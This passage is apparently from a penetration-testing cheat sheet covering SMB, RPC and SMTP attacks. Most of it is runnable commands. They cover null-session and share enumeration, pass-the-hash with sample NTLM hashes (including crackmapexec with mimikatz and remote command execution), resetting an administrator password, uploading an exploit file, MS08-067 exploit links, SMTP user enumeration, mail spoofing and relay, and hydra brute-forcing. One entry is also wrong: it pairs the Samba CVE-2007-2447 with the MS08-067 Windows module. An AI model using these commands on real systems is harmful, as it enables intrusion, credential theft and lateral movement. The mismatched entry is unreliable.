<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span><span class="o">/</span><span class="n">wwwroot</span>
<span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span><span class="o">/</span><span class="k">C</span><span class="err">$</span> <span class="n">WIN20082017</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span>
<span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span><span class="o">/</span><span class="k">C</span><span class="err">$</span> <span class="n">A433F6C2B0D8BB92D7288ECFFACFC7CD</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span> <span class="c1">--pw-nt-hash # make sure to only use the NT portion of the hash</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">\\</span><span class="n">WIN7</span><span class="err">\</span><span class="n">IPC$</span> <span class="o">-</span><span class="n">I</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">13</span><span class="p">.</span><span class="mi">218</span>
<span class="n">smbclient</span> <span class="err">\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">13</span><span class="p">.</span><span class="mi">236</span><span class="err">\</span><span class="k">some</span><span class="o">-</span><span class="k">share</span> <span class="o">-</span><span class="n">o</span> <span class="k">user</span><span class="o">=</span><span class="n">root</span><span class="p">,</span><span class="n">pass</span><span class="o">=</span><span class="n">root</span><span class="p">,</span><span class="n">workgroup</span><span class="o">=</span><span class="n">BOB</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">U</span> <span class="n">guest</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span> <span class="ss">&quot;&quot;</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">U</span> <span class="err">$</span><span class="n">username</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span>
<span class="n">password</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">prompt</span><span class="o">&gt;</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="o">//</span><span class="n">server</span><span class="o">/</span><span class="k">share</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="o">//</span><span class="n">server</span><span class="o">/</span><span class="k">share</span> <span class="n">password</span> <span class="k">options</span>
</pre></div></li>
</ul>
</li>
<li>Null session: <code class="codehilite"><span class="n">smbclient</span> <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">L</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span><span class="p">)</span> <span class="o">-</span><span class="n">m</span> <span class="n">SMB2</span></code></li>
<li>Null session mount: <code class="codehilite"><span class="n">smbclient</span> <span class="ss">&quot;\\\\(TARGET IP)\\IPC\$\\&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">m</span> <span class="n">SMB2</span></code></li>
<li>User session mount: <code class="codehilite"><span class="n">smbclient</span> <span class="ss">&quot;\\\\(TARGET IP)\\IPC\$\\&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">U</span> <span class="p">(</span><span class="k">USER</span><span class="p">)</span> <span class="o">-</span><span class="n">m</span> <span class="n">SMB2</span></code></li>
<li>Kerberos Auth: <code class="codehilite"><span class="n">smbclient</span> <span class="c1">--kerberos //ws01win10.domain.com/C$</span></code></li>
<li>Pass the hash: <code class="codehilite"><span class="n">smbclient</span> <span class="c1">--user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\(TARGET IP ADDRESS)\\(TARGET SHARE)\\ (NTLM HASH)</span></code></li>
<li>Upload file: <code class="codehilite"><span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">31</span><span class="p">.</span><span class="mi">142</span><span class="o">/</span><span class="k">ADMIN</span><span class="err">$</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;nobody&quot;</span><span class="o">%</span><span class="ss">&quot;somepassword&quot;</span> <span class="o">-</span><span class="k">c</span> <span class="ss">&quot;put 40280.py&quot;</span></code></li>
<li>Pass-the-hash:
  <div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">testuser</span><span class="o">%&lt;</span><span class="n">nthash</span><span class="o">&gt;</span> <span class="c1">--pw-nt-hash -L 192.168.0.1</span>
<span class="n">smbclient</span> <span class="err">\\\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">\\</span><span class="k">domain</span> <span class="o">-</span><span class="n">U</span> <span class="n">testuser</span><span class="o">%&lt;</span><span class="n">nthash</span><span class="o">&gt;</span> <span class="c1">--pw-nt-hash</span>
</pre></div></li>
<li>Map drives:
  <div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="err">\\\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">\\</span><span class="n">sharename$</span>
<span class="n">smbclient</span> <span class="err">\\\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">\\</span><span class="n">sharename$</span> <span class="o">-</span><span class="n">U</span> <span class="n">root</span><span class="o">%</span>
</pre></div></li>
<li>Recursive download: <a href="https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient">https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient</a>
  <div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="s1">&#39;\10.11.1.220\SYSVOL&#39;</span> <span class="o">-</span><span class="n">U</span><span class="o">=</span><span class="s1">&#39;contoso/jane%SuperPassword^&#39;</span> <span class="o">-</span><span class="k">c</span> <span class="s1">&#39;prompt OFF;recurse ON;lcd &#39;</span><span class="p">.</span><span class="o">/</span><span class="s1">&#39;;mget *&#39;</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="n">RECURSE</span> <span class="k">ON</span>
<span class="n">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="n">PROMPT</span> <span class="k">OFF</span>
<span class="n">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="n">mget</span> <span class="o">*</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">mask</span> <span class="ss">&quot;&quot;</span>
<span class="n">recurse</span> <span class="k">ON</span>
<span class="n">prompt</span> <span class="k">OFF</span>
<span class="n">cd</span> <span class="s1">&#39;path\to\remote\dir&#39;</span>
<span class="n">lcd</span> <span class="s1">&#39;~/path/to/download/to/&#39;</span>
<span class="n">mget</span> <span class="o">*</span>
</pre></div></li>
</ul>
</li>
<li>rpcclient<ul>
<li>Part of the Samba suite</li>
<li>Developed to test MS-RPC functionality in Samba</li>
<li>Usable to open an authenticated SMB session to a target machine</li>
<li>NULL session:
  <div class="codehilite"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">102</span>
</pre></div></li>
<li>User session:
  <div class="codehilite"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">htb</span><span class="err">\\</span><span class="n">james</span> <span class="n">mantis</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="k">local</span>
</pre></div></li>
<li>Kerberos Auth
  <div class="codehilite"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">k</span> <span class="n">ws01win10</span><span class="p">.</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span>
</pre></div></li>
<li>Querying:
  <div class="codehilite"><pre><span></span><span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">srvinfo</span>                  # <span class="nv">operating</span> <span class="nv">system</span> <span class="nv">version</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enum</span><span class="o">&lt;</span><span class="nv">tab</span><span class="o">&gt;&lt;</span><span class="nv">tab</span><span class="o">&gt;</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumdomusers</span>            <span class="o">//</span> <span class="nv">Username</span> <span class="nv">and</span> <span class="nv">RID</span> <span class="ss">(</span><span class="nv">suffix</span> <span class="nv">of</span> <span class="nv">SID</span><span class="ss">)</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">queryuser</span> <span class="mi">0</span><span class="nv">x3e8</span>         <span class="o">//</span> <span class="nv">Info</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">user</span> <span class="k">for</span> <span class="nv">given</span> <span class="nv">RID</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumalsgroups</span> <span class="nv">domain</span>    <span class="o">//</span> <span class="nv">Enum</span> <span class="nv">aliases</span> <span class="nv">groups</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumalsgroups</span> <span class="nv">builtin</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">lookupnames</span> <span class="nv">james</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">netshareenumall</span> # <span class="nv">enumerate</span> <span class="nv">all</span> <span class="nv">shares</span> <span class="nv">and</span> <span class="nv">its</span> <span class="nv">paths</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumdomusers</span> # <span class="nv">enumerate</span> <span class="nv">usernames</span> <span class="nv">defined</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">server</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">getdompwinfo</span> # <span class="nv">smb</span> <span class="nv">password</span> <span class="nv">policy</span> <span class="nv">configured</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">server</span>
</pre></div></li>
<li>Change password: <code class="codehilite"><span class="n">setuserinfo2</span> <span class="n">administrator</span> <span class="mi">23</span> <span class="err">‘</span><span class="n">password1234</span><span class="err">’</span></code></li>
<li>Lookup SID: <code class="codehilite"><span class="n">lookupnames</span> <span class="n">administrator</span></code></li>
<li>rpcdump.py
  <div class="codehilite"><pre><span></span><span class="n">rpcdump</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="nl">username</span><span class="p">:</span><span class="n">password</span><span class="nv">@IP_Address</span><span class="w"> </span><span class="n">port</span><span class="o">/</span><span class="n">protocol</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">e</span><span class="p">.</span><span class="w"> </span><span class="mi">80</span><span class="o">/</span><span class="n">HTTP</span><span class="p">)</span><span class="w"></span>
</pre></div></li>
<li>rpcinfo
  <div class="codehilite"><pre><span></span><span class="n">rpcinfo</span><span class="w"> </span><span class="o">[</span><span class="n">options</span><span class="o">]</span><span class="w"> </span><span class="n">IP_Address</span><span class="w"></span>
</pre></div></li>
</ul>
</li>
<li>Enum4linux<ul>
<li>Tool for enumerating information from Windows and Samba systems</li>
<li>Wrapper for <code class="codehilite"><span class="n">smbclient</span></code>, <code class="codehilite"><span class="n">rpcclient</span></code>, <code class="codehilite"><span class="n">net</span></code> and <code class="codehilite"><span class="n">nmblookup</span></code>
  <div class="codehilite"><pre><span></span><span class="n">enum4linux</span> -<span class="n">a</span> <span class="nv">$ip</span>
<span class="n">enum4linux</span> -<span class="n">U</span> <span class="nv">$ip</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="o">-</span> <span class="nv">RID</span> <span class="nv">cycling</span> <span class="ss">(</span><span class="nv">When</span> <span class="nv">RestrictAnonymous</span> <span class="nv">is</span> <span class="nv">set</span> <span class="nv">to</span> <span class="mi">1</span> <span class="nv">on</span> <span class="nv">Windows</span> <span class="mi">2000</span><span class="ss">)</span>
<span class="o">-</span> <span class="nv">User</span> <span class="nv">listing</span> <span class="ss">(</span><span class="nv">When</span> <span class="nv">RestrictAnonymous</span> <span class="nv">is</span> <span class="nv">set</span> <span class="nv">to</span> <span class="mi">0</span> <span class="nv">on</span> <span class="nv">Windows</span> <span class="mi">2000</span><span class="ss">)</span>
<span class="o">-</span> <span class="nv">Listing</span> <span class="nv">of</span> <span class="nv">group</span> <span class="nv">membership</span> <span class="nv">information</span>
<span class="o">-</span> <span class="nv">Share</span> <span class="nv">enumeration</span>
<span class="o">-</span> <span class="nv">Detecting</span> <span class="k">if</span> <span class="nv">the</span> <span class="nv">host</span> <span class="nv">is</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">workgroup</span> <span class="nv">or</span> <span class="nv">a</span> <span class="nv">domain</span>
<span class="o">-</span> <span class="nv">Identifying</span> <span class="nv">the</span> <span class="nv">remote</span> <span class="nv">operating</span> <span class="nv">system</span>
<span class="o">-</span> <span class="nv">Password</span> <span class="nv">policy</span> <span class="nv">retrieval</span>
</pre></div></li>
</ul>
</li>
<li>pth-winexe
    <div class="codehilite"><pre><span></span>pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd <span class="c1"># using a plaintext password</span>
pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span class="c1"># ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash</span>
pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span class="c1"># domain user</span>
pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span class="c1"># lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash</span>
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span class="c1"># ntlm hash + empty lm hash</span>
<span class="c1"># or</span>
<span class="nb">export</span> <span class="nv">SMBHASH</span><span class="o">=</span>aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U Administrator% //192.168.1.23 cmd
</pre></div></li>
<li>nullinux <a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a>
    <div class="codehilite"><pre><span></span>python3 nullinux.py -users -quick DC1.Domain.net
python3 nullinux.py -all <span class="m">192</span>.168.0.0-5
python3 nullinux.py -shares -U <span class="s1">&#39;Domain\User&#39;</span> -P <span class="s1">&#39;Password1&#39;</span> <span class="m">10</span>.0.0.1,10.0.0.5
</pre></div></li>
<li>acccheck<ul>
<li>Password attacks
  <div class="codehilite"><pre><span></span><span class="n">acccheck</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">t</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">P</span> <span class="o">&lt;</span><span class="n">password_file</span><span class="o">&gt;</span>
</pre></div></li>
</ul>
</li>
<li>mblookup<ul>
<li>NetBIOS over TCP/IP client used to lookup NetBIOS names</li>
</ul>
</li>
<li>CrackMapExec<ul>
<li>Automate assessing the security of large Active Directory networks
  <div class="codehilite"><pre><span></span>crackmapexec smb &lt;target<span class="o">(</span>s<span class="o">)</span>&gt; -u username -H LMHASH:NTHASH
crackmapexec smb &lt;target<span class="o">(</span>s<span class="o">)</span>&gt; -u username -H NTHASH

crackmapexec -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares <span class="m">192</span>.168.1.23
crackmapexec -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute <span class="m">4000</span> <span class="m">192</span>.168.1.23
crackmapexec -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --users <span class="m">192</span>.168.1.23
crackmapexec smb <span class="m">192</span>.168.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb <span class="m">192</span>.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz <span class="m">192</span>.168.1.0/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami <span class="m">192</span>.168.1.23
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami <span class="m">192</span>.168.1.23 <span class="c1"># reliable pth code execution</span>
</pre></div></li>
</ul>
</li>
<li>Smbexec <a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></li>
<li>wmiexec <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a>
    <div class="codehilite"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="o">&lt;</span><span class="n">ntlmhash</span><span class="o">&gt;</span> <span class="n">Administrator</span><span class="mf">@10.10.0.1</span>
</pre></div></li>
<li>SuperScan</li>
<li>Hyena</li>
<li>Winfingerprint</li>
<li>NetBIOS enumerator</li>
</ul>
<h3 id="vulnerabilities">Vulnerabilities<a class="headerlink" href="#vulnerabilities" title="Permanent link">&para;</a></h3>
<ul>
<li>Linux<ul>
<li>CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3<ul>
<li>When the "username map script" smb.conf option is enabled</li>
<li><a href="https://github.com/amriunix/cve-2007-2447">https://github.com/amriunix/cve-2007-2447</a></li>
<li><code class="codehilite"><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Windows<ul>
<li>CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption<ul>
<li>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta</li>
<li><a href="https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py">https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py</a></li>
<li><a href="https://vulners.com/exploitdb/EDB-ID:6824">https://vulners.com/exploitdb/EDB-ID:6824</a></li>
<li><code class="codehilite"><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span></code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="hardening">Hardening<a class="headerlink" href="#hardening" title="Permanent link">&para;</a></h3>
<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
<ul>
<li>NetBios<ul>
<li><a href="https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput">https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput</a></li>
<li><a href="https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser">https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=jUc1J31DNdw&amp;t=445s">https://www.youtube.com/watch?v=jUc1J31DNdw&amp;t=445s</a></li>
<li><a href="http://www.ubiqx.org/cifs/">Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/</a></li>
<li><a href="http://www.samba.org/samba/docs/using_samba/toc.html">Using Samba 2<sup>nd</sup> Edition - http://www.samba.org/samba/docs/using_samba/toc.html</a></li>
</ul>
<h2 id="smtp-25tcp">SMTP - 25/tcp<a class="headerlink" href="#smtp-25tcp" title="Permanent link">&para;</a></h2>
<p><strong>Quick Reference</strong></p>
<ul>
<li>Connect: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="err">‐</span><span class="n">nv</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">215</span> <span class="mi">25</span></code></li>
<li>Configuration files
    <div class="codehilite"><pre><span></span><span class="n">sendmail</span><span class="p">.</span><span class="n">cf</span>
<span class="n">submit</span><span class="p">.</span><span class="n">cf</span>
</pre></div></li>
<li>User enumeration with: "VRFY", "EXPN" &amp; "RCPT" commands:
    <div class="codehilite"><pre><span></span>smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <span class="m">10</span>.11.1.22
</pre></div>
    <div class="codehilite"><pre><span></span>VRFY username <span class="o">(</span>verifies <span class="k">if</span> username exists - enumeration of accounts<span class="o">)</span>
EXPN username <span class="o">(</span>verifies <span class="k">if</span> username is valid - enumeration of accounts<span class="o">)</span>
</pre></div>
    <div class="codehilite"><pre><span></span>VRFY existing_user
Results in: <span class="m">250</span>

VRFY nonexisting_user
Results in: <span class="m">550</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="k">for</span> user in <span class="k">$(</span>cat users.txt<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> VRFY <span class="nv">$user</span> <span class="p">|</span> nc -nv -w &lt;ip&gt; <span class="m">25</span> <span class="m">2</span>&gt;/dev/null <span class="p">|</span> grep ^<span class="s2">&quot;250&quot;</span><span class="p">;</span> <span class="k">done</span>
</pre></div></li>
<li>Mail Spoofing: <a href="http://0daysecurity.com/penetration-testing/enumeration.html">http://0daysecurity.com/penetration-testing/enumeration.html</a>
    <div class="codehilite"><pre><span></span><span class="n">HELO</span> <span class="n">anything</span> <span class="n">MAIL</span> <span class="k">FROM</span><span class="p">:</span> <span class="n">spoofed_address</span> <span class="n">RCPT</span> <span class="k">TO</span><span class="p">:</span><span class="n">valid_mail_account</span> <span class="k">DATA</span> <span class="p">.</span> <span class="n">QUIT</span>
</pre></div></li>
<li>Mail Relay
    <div class="codehilite"><pre><span></span><span class="n">HELO</span> <span class="n">anything</span>

<span class="n">Identical</span> <span class="n">to</span><span class="o">/</span><span class="n">from</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">nobody</span><span class="p">@</span><span class="n">domain</span><span class="o">&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">nobody</span><span class="p">@</span><span class="n">domain</span><span class="o">&gt;</span>
<span class="n">Unknown</span> <span class="n">domain</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="p">@</span><span class="n">unknown_domain</span><span class="o">&gt;</span>
<span class="n">Domain</span> <span class="n">not</span> <span class="n">present</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="p">@</span><span class="n">localhost</span><span class="o">&gt;</span>
<span class="n">Domain</span> <span class="n">not</span> <span class="n">supplied</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span>
<span class="n">Source</span> <span class="n">address</span> <span class="n">omission</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">nobody</span><span class="p">@</span><span class="n">recipient_domain</span><span class="o">&gt;</span>

<span class="n">Use</span> <span class="n">IP</span> <span class="n">address</span> <span class="n">of</span> <span class="n">target</span> <span class="n">server</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="p">@</span><span class="n">IP_Address</span><span class="o">&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">nobody</span><span class="p">@</span><span class="n">recipient_domain</span><span class="o">&gt;</span>
<span class="n">Use</span> <span class="kt">double</span> <span class="n">quotes</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="p">@</span><span class="n">domain</span><span class="o">&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="s">&quot;user@recipent-domain&quot;</span><span class="o">&gt;</span>

<span class="n">User</span> <span class="n">IP</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">target</span> <span class="n">server</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="p">@</span><span class="n">domain</span><span class="o">&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">nobody</span><span class="p">@</span><span class="n">recipient_domain</span><span class="l">@[</span><span class="n">IP</span> <span class="n">Address</span><span class="l">]</span><span class="o">&gt;</span>

<span class="n">Disparate</span> <span class="n">formatting</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="l">@[</span><span class="n">IP</span> <span class="n">Address</span><span class="l">]</span><span class="o">&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="p">@</span><span class="nl">domain</span><span class="p">:</span><span class="n">nobody</span><span class="p">@</span><span class="n">recipient</span><span class="o">-</span><span class="n">domain</span><span class="o">&gt;</span>

<span class="n">Disparate</span> <span class="n">formatting2</span> <span class="o">-</span> <span class="n">mail</span> <span class="nl">from</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">user</span><span class="l">@[</span><span class="n">IP</span> <span class="n">Address</span><span class="l">]</span><span class="o">&gt;</span> <span class="n">rcpt</span> <span class="nl">to</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">recipient_domain</span><span class="o">!</span><span class="n">nobody</span><span class="l">@[</span><span class="n">IP</span> <span class="n">Address</span><span class="l">]</span><span class="o">&gt;</span>
</pre></div>
    &gt; <a href="http://0daysecurity.com/penetration-testing/enumeration.html">http://0daysecurity.com/penetration-testing/enumeration.html</a></li>
</ul>
<ul>
<li>Sending a mail
    <div class="codehilite"><pre><span></span><span class="nv">HELO</span> <span class="nv">my</span>.<span class="nv">server</span>.<span class="nv">com</span>
<span class="nv">MAIL</span> <span class="nv">FROM</span>:
<span class="nv">RCPT</span> <span class="nv">TO</span>:
<span class="nv">DATA</span>
<span class="nv">From</span>: <span class="nv">Danny</span> <span class="nv">Dolittle</span>
<span class="nv">To</span>: <span class="nv">Sarah</span> <span class="nv">Smith</span>
<span class="nv">Subject</span>: <span class="nv">Email</span> <span class="nv">sample</span>
<span class="nv">Mime</span><span class="o">-</span><span class="nv">Version</span>: <span class="mi">1</span>.<span class="mi">0</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span>: <span class="nv">text</span><span class="o">/</span><span class="nv">plain</span><span class="c1">; charset=us-ascii</span>

<span class="nv">This</span> <span class="nv">is</span> <span class="nv">a</span> <span class="nv">test</span> <span class="nv">email</span> <span class="k">for</span> <span class="nv">you</span> <span class="nv">to</span> <span class="nv">read</span>.
.
<span class="nv">QUIT</span>
</pre></div></li>
<li>Brute-forcing: <code class="codehilite"><span class="n">hydra</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span> <span class="n">smtp</span> <span class="o">-</span><span class="n">l</span> <span class="p">(</span><span class="n">USERNAME</span><span class="p">)</span> <span class="o">-</span><span class="n">P</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">wordlist</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">V</span> <span class="o">-</span><span class="n">s</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">PORT</span><span class="p">)</span></code></li>
</ul>
<p>Other commands</p>
<table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">ATRN</td>
<td align="left">Authenticated TURN</td>
</tr>
<tr>
<td align="left">AUTH</td>
<td align="left">Authentication</td>
</tr>
<tr>
<td align="left">BDAT</td>
<td align="left">Binary data</td>
</tr>
<tr>
<td align="left">BURL</td>
<td align="left">Remote content</td>
</tr>
<tr>
<td align="left">DATA</td>
<td align="left">The actual email message to be sent. This command is terminated with a line that contains only a</td>
</tr>
<tr>
<td align="left">EHLO</td>
<td align="left">Extended HELO</td>
</tr>
<tr>
<td align="left">ETRN</td>
<td align="left">Extended turn</td>
</tr>
<tr>
<td align="left">EXPN</td>
<td align="left">Expand</td>
</tr>
<tr>
<td align="left">HELO</td>
<td align="left">Identify yourself to the SMTP server.</td>
</tr>
<tr>
<td align="left">HELP</td>
<td align="left">Show available commands</td>
</tr>
<tr>
<td align="left">MAIL</td>
